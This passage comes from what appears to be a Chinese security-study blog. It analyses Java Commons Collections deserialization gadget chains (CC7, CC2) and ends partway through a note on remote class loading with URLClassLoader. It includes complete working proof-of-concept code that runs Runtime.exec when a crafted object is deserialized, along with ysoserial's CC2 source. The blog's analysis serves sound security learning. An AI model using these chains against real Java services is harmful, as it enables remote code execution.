class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1,chain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chain);</span><br><span class="line"></span><br><span class="line">        lazymap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        lazymap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazymap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        lazymap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="comment">//这里必须要调用remove函数，否则不能弹出计算器，后文说明。</span></span><br><span class="line">        setValue(chain,<span class="string">&quot;iTransformers&quot;</span>,transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC7.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">ob</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(output);</span><br><span class="line">            ob.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC7.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ob2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(input);</span><br><span class="line">            ob2.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object object,String name,Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529232811138.png" alt="image-20230529232811138"></p><h3 id="调用remove-的原因："><a href="#调用remove-的原因：" class="headerlink" title="调用remove()的原因："></a>调用remove()的原因：</h3><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529233742118.png" alt="image-20230529233742118"></p><p>当我们在这里，像hashtable中存入键值的时候，可以跟一下put方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529233915952.png" alt="image-20230529233915952"></p><p>可以看到，这里就已经调用了一次<code>entry.key.equals(key)</code>，也就是已经调用了一次触发链。</p><p>注意，这里<code>put(lazymap1,1)</code>的时候，是不会触发的，因为不会进入for循环，需要在<code>put(lazymap2,1)</code>的时候才会触发。</p><p>这里直接一路跟到后面，<code>AbstractMap#equals()</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529235052212.png" alt="image-20230529235052212"></p><p>此时，是lazymap1中super.map对应的键值对，也就是<code>yy=&gt;1</code></p><p>随后调用的是m.get(key)，也就是调用的lazymap2中的get方法，此时将<code>yy</code>作为key传入。</p><p>也就是说，到了lazymap2的<code>LazyMap#get()</code>时，传递进入的key参数是<code>yy</code></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529235629501.png" alt="image-20230529235629501"></p><p>很显然，此时是没有<code>yy</code>这个键的，所以会将yy传入lazymap2的super.map中。</p><p>super.map中就有两个键了，在后续执行的时候就会失败。所以需要remove掉。</p><p>但是不止这个地方有问题，</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230529235957173.png" alt="image-20230529235957173"></p><p>事实上在进行到这部分的时候，就会因为size为2而被截断。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这里跟完了CC链的所有链子，感觉学到了不少，但是还是常用常新。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC链学习中</title>
      <link href="/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/"/>
      <url>/2023/09/21/CC%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="CC链学习中："><a href="#CC链学习中：" class="headerlink" title="CC链学习中："></a>CC链学习中：</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>P神的Java安全漫谈中给出的学习路线是先学CC6，因为CC6提供了一个CC1在高版本下的解决条件，但是为了加强自己的分析能力，我还是准备按着顺序来走一遍。</p><p>这里的整体思路和调用链，将会主要参考网络上的文章还有ysoserial中的调用链。</p><h2 id="CC2："><a href="#CC2：" class="headerlink" title="CC2："></a>CC2：</h2><h3 id="调用链："><a href="#调用链：" class="headerlink" title="调用链："></a>调用链：</h3><blockquote><p>Gadget chain:<br> ObjectInputStream.readObject()<br>    PriorityQueue.readObject()<br>       …<br>          TransformingComparator.compare()<br>             InvokerTransformer.transform()<br>                Method.invoke()<br>                   Runtime.exec()</p></blockquote><p>可以看到这里多了几个类，首先了解一下这几个类：</p><h4 id="PriorityQueue-class"><a href="#PriorityQueue-class" class="headerlink" title="PriorityQueue.class:"></a>PriorityQueue.class:</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507172311136.png" alt="image-20230507172311136"></p><h4 id="TransformingComparator-class"><a href="#TransformingComparator-class" class="headerlink" title="TransformingComparator.class:"></a>TransformingComparator.class:</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230507172855474.png" alt="image-20230507172855474"></p><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>这里不难看出来，整条链子的触发点在PriorityQueue类中。</p><h4 id="readObejct"><a href="#readObejct" class="headerlink" title="readObejct():"></a>readObejct():</h4><p>这里，我们首先进入<code>PriorityQueue#readObject</code>观察一下方法：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509223402766.png" alt="image-20230509223402766"></p><p>整个调用顺序是，首先调用了默认的读入，然后调用了readInt()，然后检查读入流数组长度是否超过预期。这部分都是普通的反序列化读入。</p><p>随后，从创建Object类的数组开始，其实就是实现了这个类最重要的特性，创建了一个基于堆的队列优先数组。</p><p>在for循环中，就是将反序列化数据流中的元素，一个一个存在<code>queue</code>这个数组中，然后开始调用函数<code>heapify()</code>来进行重新排列。</p><h4 id="heapify"><a href="#heapify" class="headerlink" title="heapify():"></a>heapify():</h4><p>这里跟进<code>heapify()</code>函数中：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509225229839.png" alt="image-20230509225229839"></p><p>函数很干净，可以看到这里有一个for循环，然后调用了一个<code>siftDown()</code>函数，这个函数是什么呢。</p><h4 id="siftDown"><a href="#siftDown" class="headerlink" title="siftDown():"></a>siftDown():</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509225621646.png" alt="image-20230509225621646"></p><p>也就是说，这个函数其实就是实现了一个堆排序，也就等于说是整个heapify()函数的核心。</p><p>再次跟进一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509235208808.png" alt="image-20230509235208808"></p><p>两个函数：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509235240041.png" alt="image-20230509235240041"></p><p>这部分函数的效果是一个算法，具体可以自己理解一下，实际上就是将一个堆转换为一个最小堆。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230509235402391.png" alt="image-20230509235402391"></p><p>这个方法实际上是差不多的，只是因为我们没有设置<code>comparator</code>，所以他强制性的转换了一个<code>key</code>对象，作为这个<code>comparator</code>对象，用于调用<code>compareTo()</code>方法。</p><p>因为我们之前在调用链中存在一个TransformingComparator.compare()，因此我们可以知道<code>comparator</code>是一个<code>TransformingComparator</code>类的对象，用于调用其compare()方法。</p><p>这里进入org.apache.commons.collections4.comparators;</p><p>可以找到compare()方法:</p><h4 id="compare-："><a href="#compare-：" class="headerlink" title="compare()："></a>compare()：</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230510001500217.png" alt="image-20230510001500217"></p><p>这里可以看到，调用了<code>this.transformer</code>的<code>transform()</code>方法。因为<code>this.transformer</code>这个变量是我们可以控制的，所以可以直接一波转进到我们之前学习过的CC1链子里。</p><p>到这里，就算是走通了调用链。</p><h3 id="初版POC"><a href="#初版POC" class="headerlink" title="初版POC:"></a>初版POC:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.offer(<span class="number">1</span>);</span><br><span class="line">        queue.offer(<span class="number">2</span>);<span class="comment">//调用offer()方法随便给队列中添加两个参数，调用add()也可以，add()最后也是调用的offer()方法。</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(filepath);</span><br><span class="line">            object.writeObject(queue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里对queue中的队列添加了两个元素，这是因为PriorityQueue类其实就是一个排列方法，最后完成一个最大或者最小堆，就像我们之前分析siftDown()方法一样。</p><p>为了调用这个方法，会要求队列中至少有三个成员，也就是一个非叶子节点和它的左右子节点。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511214110850.png" alt="image-20230511214110850"></p><p>所以，我们需要让队列中有至少三个成员。</p><p>POC看上去好像挺美好的，但是有一个问题，当我运行这个POC的时候，会发现它直接调用了我的计算器，但是不会进行序列化。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511214302512.png" alt="image-20230511214302512"></p><p>这里步进调试，来看看是怎么回事：<br>我们可以发现，在我们添加第二个元素的时候，也就是<code>queue.offer(2)</code>的时候，会从offer()函数进入到siftUp()函数。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511215756672.png" alt="image-20230511215756672"></p><p>因为此时，我们已经设置了comparator的参数，所以这里会直接进入if分支，调用<code>siftUpUsingComparable()</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511232123570.png" alt="image-20230511232123570"></p><p>当我们开始调用该函数的时候，会进入if()，然后开始调用<code>comparator.compare()</code>方法，这里也就是开始调用<code>TransformingComparator#compare()</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511232303413.png" alt="image-20230511232303413"></p><p>前面会调用两次ChainedTransformer类，也就会触发两次我们设计好的计算器，随后会直接return，直接结束了。因此不会执行后续的代码。</p><p>可以看到整体是没什么问题的，只要能改掉这里就行了。</p><h3 id="修改后POC"><a href="#修改后POC" class="headerlink" title="修改后POC:"></a>修改后POC:</h3><p>为了达成上述操作，我们就不能进入<code>siftUpUsingComparator()</code>方法，也就是不能在创建对象的时候，传入<code>comparator</code>参数。</p><p>这时，当我们向队列中添加元素的时候，就不会触发，而是触发<code>siftUpComparator()</code>方法替代。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230511233121447.png" alt="image-20230511233121447"></p><p>可以看到的是，这里是将x，强制转换为了一个Comparable类，然后在if中调用了它的<code>compareTo()</code>方法，整个函数过程其实就是进行一个赋值，不会直接结束。</p><p>但是赋值完之后，要怎么才能给里面的元素添加我们封装好的<code>TransformingComparator</code>类呢？</p><p>这里最简单的方式就是通过反射，将我们封装好的类添加进去。</p><p>在POC中添加以下代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(queue,comparator);</span><br></pre></td></tr></table></figure><p>因为设置了comparator参数，所以等到时候readObject()的时候，就会按照我们想要的调用链开始。</p><p>随后调整一下顺序，我们就得到了完整的POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;C:\\Windows\\WinSxS\\wow64_microsoft-windows-calc_31bf3856ad364e35_10.0.19041.1_none_6a03b910ee7a4073\\calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chaintransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chaintransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);<span class="comment">//创建实例。注意下面的顺序改变了。</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);<span class="comment">//传入两个参数</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);<span class="comment">//反射获取成员变量的field</span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);<span class="comment">//获取访问权限</span></span><br><span class="line">        field.set(queue,comparator);<span class="comment">//设置参数</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(filepath);</span><br><span class="line">            object.writeObject(queue);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">filepath2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC2.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(filepath2);</span><br><span class="line">            input.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException error)&#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用效果:</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230512005246067.png" alt="image-20230512005246067"></p><h3 id="调用方式2："><a href="#调用方式2：" class="headerlink" title="调用方式2："></a>调用方式2：</h3><p>当然，在上面写的POC是调用的ChainedTransformer类中的链条，在ysoserial中给出的调用链是使用的</p><blockquote><p> TransformingComparator.compare()<br>           InvokerTransformer.transform()<br>              Method.invoke()<br>                 Runtime.exec()</p></blockquote><p>这里的调用思路就和我们之前简单使用<code>ChainedTransformer</code>不一样了，这里首先跟一下函数的调用。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230512164437598.png" alt="image-20230512164437598"></p><p>因为我们在调用transform()方法的时候，是传入了参数的，这里直接进else分支，然后调用method.invoke()，这里其实就是直接通过反射，来进行函数的调用。</p><p>但是这里反射的对象是input，也就是在调用Transform函数的时候传入的Object，这里回头看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513205010913.png" alt="image-20230513205010913"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513205247504.png" alt="image-20230513205247504"></p><p>因此，我们在调用<code>InvokerTransformer#transform()</code>方法中反射的过程的时候，其实是调用的Object类中的<code>toString()</code>方法。</p><p>这个时候，我们就会发现，调用这个方法只会单纯的返回当前类的名字，没有什么调用方式，那么上述调用链是怎么实现的呢，让我们回头再重新阅读一下ysoserial的源码。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513231355118.png" alt="image-20230513231355118"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br></pre></td></tr></table></figure><p>要看懂ysoserial中的源码，我们首先需要学会一些前置知识，这里主要参考P神的Java安全漫谈。</p><h2 id="Java中动态加载字节码："><a href="#Java中动态加载字节码：" class="headerlink" title="Java中动态加载字节码："></a>Java中动态加载字节码：</h2><h3 id="什么是Java的“字节码”："><a href="#什么是Java的“字节码”：" class="headerlink" title="什么是Java的“字节码”："></a>什么是Java的“字节码”：</h3><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中。</p><p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台的JVM虚拟机中。</p><p>甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20230513232506252.png" alt="image-20230513232506252"></p><p>或者这么理解，字节码相较于Java就相当于C语言之于Python，也就是Java语言的底层实现方式，当任意一个文件，只要最后编译后，是一个字节码文件，就可以在JVM中运行。</p><h3 id="利用URLClassLoader加载远程Class文件："><a href="#利用URLClassLoader加载远程Class文件：" class="headerlink" title="利用URLClassLoader加载远程Class文件："></a>利用URLClassLoader加载远程Class文件：</h3><p>在Java中，ClassLoader就是用来加载字节码文件最基础的方法，会告诉JVM如何加载这个类，默认的就是通过类的名字来加载类，比如<code>java.lang.Runtime</code>。</p><p>其中，有一个ClassLoader就是<code>URLClassLoader</code>类。</p><p><code>URLClassLoader</code>类实际上是我们平时默认使用的AppClassLoader的父类，所以我们基本上就是在理解默认的Java类加载器的工作原理。</p><p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code> 和 <code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的 <code>java.net.URL</code> 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><ol><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ol><p>也就是说，如果我们使用的是HTTP协议，而不是file协议，就会通过URL来远程加载类。</p><p>理论上来讲，这里会有SSRF的风险。</p><p>P神给了一个例子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClassLoader</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception&#123; <span class="comment">//这里P神放了一个程序http://localhost:8000/Hello.class</span></span><br><span class="line">URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;;</span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">c.newInstance();</span><br><span class="line">&#125;</span><br><span 